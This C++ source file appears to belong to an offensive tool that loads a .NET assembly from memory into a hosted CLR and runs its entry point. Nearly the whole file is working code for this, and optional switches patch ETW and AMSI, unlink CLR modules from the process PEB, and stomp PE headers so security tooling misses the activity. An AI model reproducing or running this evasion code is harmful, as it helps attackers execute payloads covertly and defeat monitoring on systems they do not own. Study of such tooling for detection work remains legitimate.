#include "HostCLR.h"
#include "Helpers.h"
#include <string>
#include "Util.h"
#include "PEModuleHelper.h"
#include "PatternScan.h"
#include "PEB.h"

const char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
const char v2[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };

void stompHeaders();
BOOL _EnumLoadedRuntimes(IEnumUnknown** pRuntimeEnum, ICLRMetaHost* pMetaHost);

int InjectAssembly(LPSTR assemblyBytes, ULONG assemblyLength, LPSTR* arguments, size_t argsCount, const wchar_t* _unlinkmodules, const wchar_t* _stompheaders, const wchar_t* _amsi, const wchar_t* _etw) {

	ICLRMetaHost* pMetaHost;
	ICLRRuntimeInfo* pRuntimeInfo;
	_MethodInfoPtr pMethodInfo = NULL;
	_AssemblyPtr pAssembly = NULL;
	_AppDomain* pDefaultAppDomain = NULL;
	IUnknown* pAppDomainThunk = NULL;
	HRESULT hr;

	//Patching Etw
	if (*_etw == '1')
		patchEtw();

	if (!_CLRCreateInstance(&pMetaHost)) {
		return -1;
	}

	IEnumUnknown* pRuntimeEnum;
	if (!_EnumLoadedRuntimes(&pRuntimeEnum, pMetaHost)) {
		goto Cleanup;
	}

	//Extract which CLR version used to build the .net assembly
	bool _isCLRV4 = false;
	_isCLRV4 = checkCLRVersion(assemblyBytes, assemblyLength, v4, sizeof(v4));
	LPWSTR _version = _isCLRV4 ? L"v4.0.30319" : L"v2.0.50727";

	//Check if CLR is already loaded.
	BOOL _isCLRLoaded = isCLRLoaded(_version, pRuntimeEnum, (PVOID*)&pRuntimeInfo);

	if (!_isCLRLoaded) {
		if (!_GetRuntime(pMetaHost, &pRuntimeInfo, _version)) {
			goto Cleanup;
		}

		if (!_isLoadable(pRuntimeInfo)) {
			goto Cleanup;
		}
	}

	ICorRuntimeHost* pRuntimeHost = NULL;
	if (!_GetInterface(&pRuntimeHost, pRuntimeInfo)) {
		goto Cleanup;
	}

	if (!_isCLRLoaded) {
		if (!_StartRuntimeHost(pRuntimeHost)) {
			goto Cleanup;
		}
	}

	if (!_GetDefaultDomain(pRuntimeHost, &pAppDomainThunk)) {
		goto Cleanup;
	}

	if (!_QueryInterface(&pDefaultAppDomain, pAppDomainThunk)) {
		goto Cleanup;
	}

	SAFEARRAYBOUND rgsabound[1];
	rgsabound[0].cElements = assemblyLength;
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
	PVOID pvData = NULL;
	if (!_SafeArrayAccessData(&pSafeArray, &pvData)) {
		goto Cleanup;
	}

	memcpy(pvData, assemblyBytes, assemblyLength);
	if (!_SafeArrayUnaccessData(pSafeArray)) {
		goto Cleanup;
	}

	if (!_Load(pDefaultAppDomain, pSafeArray, &pAssembly)) {

	}

	if (!_GetEntryPoint(pAssembly, &pMethodInfo)) {
		goto Cleanup;
	}

	//setting entrypoint method parameters
	SAFEARRAY *params = setEntrypointParams(arguments, argsCount);

	//Patching AMSI
	if (*_amsi == '1')
		patchAmci();


	//Unlink CLR Modules
	if (*_unlinkmodules == '1') {
		unlinkModules();
		_separator();
		fflush(stdout);
	}


	//Stomping PE DOS Headers
	if (*_stompheaders == '1') {
		stompHeaders();
		_separator();
		fflush(stdout);
	}


	//Invoke entrypoint method with params.
	VARIANT retVal, obj;
	ZeroMemory(&retVal, sizeof(VARIANT));
	ZeroMemory(&obj, sizeof(VARIANT));
	obj.vt = VT_NULL;
	hr = pMethodInfo->Invoke_3(obj, params, &retVal);

	if (FAILED(hr)) {
		printf("[!] pMethodInfo->Invoke_3(...) failed, hr = %X\n", hr);
		fflush(stdout);
		goto Cleanup;
	}

	cleanup(params, pRuntimeHost, pRuntimeInfo, pMetaHost, pRuntimeEnum);

	return 1;

Cleanup:
	cleanup(params, pRuntimeHost, pRuntimeInfo, pMetaHost, pRuntimeEnum);
	return 0;
}


BOOL _CLRCreateInstance(ICLRMetaHost** pMetaHost) {

	HRESULT hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (PVOID*)pMetaHost);
	if (FAILED(hr)) {
		printf("[!] CLRCreateInstance(...) failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;

}

BOOL _EnumLoadedRuntimes(IEnumUnknown** pRuntimeEnum, ICLRMetaHost* pMetaHost) {

	ADDR kernel32_base = findModuleBase(_kernel32dll);
	_PFNGetCurrentProcess GetCurrentProcess = (_PFNGetCurrentProcess)findExportAddr(kernel32_base, _GetCurrentProcess);

	HRESULT hr = pMetaHost->EnumerateLoadedRuntimes(GetCurrentProcess(), pRuntimeEnum);
	if (FAILED(hr)) {
		printf("[!]: EnumerateLoadedRuntimes failed w/hr 0x%08lx\n", hr);
		fflush(stdout);
		return 0;
	}

	return 1;
}

BOOL _GetRuntime(ICLRMetaHost* pMetaHost, ICLRRuntimeInfo** pRuntimeInfo, LPWSTR _version) {

	HRESULT hr = pMetaHost->GetRuntime(_version, IID_ICLRRuntimeInfo, (PVOID*)pRuntimeInfo);
	if (FAILED(hr)) {
		printf("[!] pMetaHost->GetRuntime(...) failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;
}

BOOL _isLoadable(ICLRRuntimeInfo* pRuntimeInfo) {

	BOOL bLoadable;
	HRESULT hr = pRuntimeInfo->IsLoadable(&bLoadable);
	if (FAILED(hr) || !bLoadable) {
		printf("[!] pRuntimeInfo->IsLoadable(...) failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;
}

BOOL _GetInterface(ICorRuntimeHost** pRuntimeHost, ICLRRuntimeInfo* pRuntimeInfo) {

	HRESULT hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (PVOID*)pRuntimeHost);
	if (FAILED(hr)) {
		printf("[!] pRuntimeInfo->GetInterface(...) failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;
}

BOOL _StartRuntimeHost(ICorRuntimeHost* pRuntimeHost) {

	HRESULT hr = pRuntimeHost->Start();
	if (FAILED(hr)) {
		printf("[!] pRuntimeHost->Start() failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;
}

BOOL isCLRLoaded(LPWSTR version, IEnumUnknown* pEnumerator, LPVOID* pRuntimeInfo) {

	WCHAR wszVersion[100];
	DWORD cchVersion = ARRLEN(wszVersion);
	IUnknown * pUnk = NULL;
	BOOL _found = FALSE;
	HRESULT hr;

	while (pEnumerator->Next(1, &pUnk, NULL) == S_OK) {

		hr = pUnk->QueryInterface(IID_ICLRRuntimeInfo, (LPVOID *)&pRuntimeInfo);

		if (SUCCEEDED(hr)) {
			hr = ((ICLRRuntimeInfo*)pRuntimeInfo)->GetVersionString(wszVersion, &cchVersion);
			if (wcscmp(wszVersion, version) == 0) {
				_found = TRUE;
				break;
			}
		}
	}

	return _found; 
}

BOOL _GetDefaultDomain(ICorRuntimeHost* pRuntimeHost, IUnknown** pAppDomainThunk) {

	HRESULT hr = pRuntimeHost->GetDefaultDomain(pAppDomainThunk);
	if (FAILED(hr)) {
		printf("[!] pRuntimeHost->GetDefaultDomain(...) failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;
}

BOOL _QueryInterface(_AppDomain** pDefaultAppDomain, IUnknown* pAppDomainThunk) {

	HRESULT hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (PVOID*)pDefaultAppDomain);
	if (FAILED(hr)) {
		printf("[!] pAppDomainThunk->QueryInterface(...) failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;
}

BOOL _SafeArrayAccessData(SAFEARRAY** pSafeArray, PVOID* pvData) {

	HRESULT hr = SafeArrayAccessData(*(pSafeArray), pvData);
	if (FAILED(hr))
	{
		printf("[!] SafeArrayAccessData(...) failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;
}

BOOL _SafeArrayUnaccessData(SAFEARRAY* pSafeArray) {

	HRESULT hr = SafeArrayUnaccessData(pSafeArray);
	if (FAILED(hr)) {
		printf("[!] SafeArrayUnaccessData(...) failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;
}

BOOL _Load(_AppDomain* pDefaultAppDomain, SAFEARRAY* pSafeArray, _Assembly** pAssembly) {

	HRESULT hr = pDefaultAppDomain->Load_3(pSafeArray, pAssembly);
	if (FAILED(hr)) {
		printf("[!] pDefaultAppDomain->Load_3(...) failed\n");
		fflush(stdout);
		return 0;
	}
	return 1;
}

BOOL _GetEntryPoint(_Assembly* pAssembly, _MethodInfo** pMethodInfo) {

	HRESULT hr = pAssembly->get_EntryPoint(pMethodInfo);
	if (FAILED(hr)) {
		printf("[!] pAssembly->get_EntryPoint(...) failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;
}

SAFEARRAY* setEntrypointParams(LPSTR* arguments, size_t argsCount) {

	VARIANT args;
	args.vt = VT_ARRAY | VT_BSTR;
	SAFEARRAYBOUND argsBound[1];
	argsBound[0].lLbound = 0;
	size_t argsLength = arguments != NULL ? argsCount : 0;
	argsBound[0].cElements = argsLength;
	args.parray = SafeArrayCreate(VT_BSTR, 1, argsBound);
	LONG idx[1];
	for (size_t i = 0; i < argsLength; i++) {
		idx[0] = i;
		SafeArrayPutElement(args.parray, idx, SysAllocString(_bstr_t(arguments[i]).Detach()));
	}
	SAFEARRAY* params = NULL;
	SAFEARRAYBOUND paramsBound[1];
	paramsBound[0].lLbound = 0;
	paramsBound[0].cElements = 1;
	params = SafeArrayCreate(VT_VARIANT, 1, paramsBound);
	idx[0] = 0;
	SafeArrayPutElement(params, idx, &args);

	ZeroMemory(&args, sizeof(VARIANT));

	return params;
}

void stompHeaders() {

	ADDR kernel32_base = findModuleBase(_kernel32dll);
	_PFNGetCurrentProcessId GetCurrentProcessId = (_PFNGetCurrentProcessId)findExportAddr(kernel32_base, _GetCurrentProcessId);

	_PFNOpenProcess OpenProcess = (_PFNOpenProcess)findExportAddr(kernel32_base, _OpenProcess);
	HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, GetCurrentProcessId());
	StompPEHeaders(hProcess);
}

void unlinkModules() {
	printf("[+]: Scanning for any loaded modules with the name '*clr*', '*mscoree*'...\n");
	printf("[+] Unlinking CLR related modules from PEB\n");
	fflush(stdout);

	UnlinkModuleWithStr("clr");
	UnlinkModuleWithStr("mscore");
}

void cleanup(SAFEARRAY* params, ICorRuntimeHost* pRuntimeHost, ICLRRuntimeInfo* pRuntimeInfo, ICLRMetaHost* pMetaHost, IEnumUnknown* pRuntimeEnum) {
	if (pRuntimeEnum) pRuntimeEnum->Release();
	if (pMetaHost) pMetaHost->Release();
	pRuntimeHost->Stop();
	pRuntimeHost->Release();
	SafeArrayDestroy(params);
	params = NULL;
}




